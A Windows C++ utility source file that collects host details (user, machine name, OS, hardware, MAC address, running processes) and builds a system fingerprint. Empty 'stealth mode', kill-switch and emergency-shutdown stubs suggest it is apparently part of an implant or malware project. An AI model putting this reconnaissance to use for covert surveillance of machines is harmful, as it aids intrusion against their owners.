// src/utils/SystemUtils.cpp
#include "utils/SystemUtils.h"
#include "core/Logger.h"
#include <sstream>
#include <algorithm>
#include <vector>
#include <cstdint>
#include <string>
#include <cctype>
#include <cstdio>
#include <chrono>
#include <iomanip>

#include "StringUtils.h"

#include <Lmcons.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <wininet.h>
#include <Windows.h>
#include <winreg.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

namespace utils {

// Static helper function for getting computer name
static std::string GetComputerNameHelper() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD size = sizeof(buffer);
    
    if (::GetComputerNameA(buffer, &size)) {
        return std::string(buffer, size);
    }
    return "Unknown";
}

// Non-static method that calls the static helper
std::string SystemUtils::GetComputerNameA() {
    return GetComputerNameHelper();
}

std::string SystemUtils::GetUserName() {
    char buffer[UNLEN + 1] = {0};
    DWORD size = sizeof(buffer);

    if (::GetUserNameA(buffer, &size)) {
        return std::string(buffer, size - 1); // Exclude null terminator
    }
    return "Unknown";
}

std::string SystemUtils::GetOSVersion() {
    OSVERSIONINFOEXA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    
    if (::GetVersionExA((OSVERSIONINFOA*)&osvi)) {
        return StringUtils::Format("%d.%d.%d %s", 
                                   osvi.dwMajorVersion, osvi.dwMinorVersion,
                                   osvi.dwBuildNumber, osvi.szCSDVersion);
    }
    return "Unknown";
}

uint64_t SystemUtils::GetMemorySize() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    
    if (::GlobalMemoryStatusEx(&memoryStatus)) {
        return memoryStatus.ullTotalPhys;
    }
    return 0;
}

std::string SystemUtils::GetProcessorInfo() {
    HKEY hKey;
    char processorName[256] = {0};
    DWORD size = sizeof(processorName);
    
    if (::RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (::RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL,
                               (LPBYTE)processorName, &size) == ERROR_SUCCESS) {
            ::RegCloseKey(hKey);
            return std::string(processorName);
        }
        ::RegCloseKey(hKey);
    }
    return "Unknown";
}

std::string SystemUtils::GetSystemFingerprint() {
    std::string fingerprint = GetComputerNameHelper() + SystemUtils::GetUserName() + SystemUtils::GetProcessorInfo();
    return fingerprint;
}

bool SystemUtils::IsElevated() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (!::AllocateAndInitializeSid(&ntAuthority, 2,
                                    SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                                    0, 0, 0, 0, 0, 0, &adminGroup)) {
        return false;
    }

    if (!::CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
        isAdmin = FALSE;
    }

    if (adminGroup) {
        ::FreeSid(adminGroup);
    }
    return isAdmin;
}

bool SystemUtils::EnableStealthMode() {
    // Implement various stealth techniques
    return true;
}

bool SystemUtils::IsExitTriggered() {
    // Check for exit conditions like specific files or registry keys
    return false;
}

SystemInfo SystemUtils::CollectSystemInformation() {
    SystemInfo info;
    info.computerName = GetComputerNameHelper(); // Use static helper function
    info.userName = SystemUtils::GetUserName(); // Call static method explicitly
    info.osVersion = SystemUtils::GetOSVersion(); // Call static method explicitly
    info.memorySize = SystemUtils::GetMemorySize(); // Call static method explicitly
    info.processorInfo = SystemUtils::GetProcessorInfo(); // Call static method explicitly
    
    // Initialize disk size
    ULARGE_INTEGER freeBytes, totalBytes, totalFreeBytes;
    if (::GetDiskFreeSpaceExA("C:", &freeBytes, &totalBytes, &totalFreeBytes)) {
        info.diskSize = totalBytes.QuadPart;
    } else {
        info.diskSize = 0;
    }
    
    // Get network info
    info.networkInfo = SystemUtils::GetMACAddress(); // Call static method explicitly
    info.runningProcesses = SystemUtils::GetRunningProcesses(); // Call static method explicitly
    
    // Get current timestamp
    auto now = std::chrono::system_clock::now();
    auto now_time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&now_time_t), "%Y-%m-%d %H:%M:%S");
    info.timestamp = ss.str();
    
    return info;
}

std::vector<std::string> SystemUtils::GetRunningProcesses() {
    std::vector<std::string> processes;
    
    DWORD processesIds[1024], cbNeeded;
    
    if (::EnumProcesses(processesIds, sizeof(processesIds), &cbNeeded)) {
        DWORD cProcesses = cbNeeded / sizeof(DWORD);
        
        for (DWORD i = 0; i < cProcesses; i++) {
            if (processesIds[i] != 0) {
                char processName[MAX_PATH] = "<unknown>";
                HANDLE hProcess = ::OpenProcess(PROCESS_QUERY_INFORMATION |
                                                PROCESS_VM_READ, FALSE, processesIds[i]);
                
                if (hProcess) {
                    HMODULE hMod;
                    DWORD cbNeededMod;
                    
                    if (::EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededMod)) {
                        ::GetModuleBaseNameA(hProcess, hMod, processName,
                                             sizeof(processName));
                    }
                    ::CloseHandle(hProcess);
                }
                
                processes.push_back(processName);
            }
        }
    }
    
    return processes;
}

bool SystemUtils::CheckInternetConnection() {
    return ::InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
}

std::string SystemUtils::GetMACAddress() {
    PIP_ADAPTER_INFO adapterInfo = nullptr;
    ULONG bufferSize = 0;
    
    // Get the required buffer size
    if (::GetAdaptersInfo(nullptr, &bufferSize) == ERROR_BUFFER_OVERFLOW) {
        adapterInfo = (PIP_ADAPTER_INFO)new char[bufferSize];
        
        if (::GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_SUCCESS) {
            PIP_ADAPTER_INFO adapter = adapterInfo;
            if (adapter) {
                char mac[18];
                snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                         adapter->Address[0], adapter->Address[1],
                         adapter->Address[2], adapter->Address[3],
                         adapter->Address[4], adapter->Address[5]);
                
                delete[] (char*)adapterInfo;
                return mac;
            }
        }
        delete[] (char*)adapterInfo;
    }
    
    return "Unknown";
}

void SystemUtils::CriticalShutdown() {
    // Emergency cleanup and shutdown procedure
    ::ExitProcess(0);
}

} // namespace utils